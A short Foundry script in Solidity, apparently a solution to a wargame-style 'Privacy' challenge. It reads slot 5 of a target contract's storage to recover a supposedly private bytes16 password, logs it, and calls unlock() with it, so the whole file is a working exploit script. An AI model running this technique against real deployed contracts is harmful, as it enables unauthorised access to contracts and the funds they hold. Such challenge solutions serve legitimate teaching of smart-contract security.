// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract AttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address target = vm.envAddress("PRIVACY_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        bytes16 password = bytes16(vm.load(target, bytes32(uint256(5))));
        console.log("PASSWORD:");
        console.logBytes16(password);
        (bool success, ) = target.call(
            abi.encodeWithSignature("unlock(bytes16)", password)
        );
        require(success, "unlock failed");
        vm.stopBroadcast();
    }
}
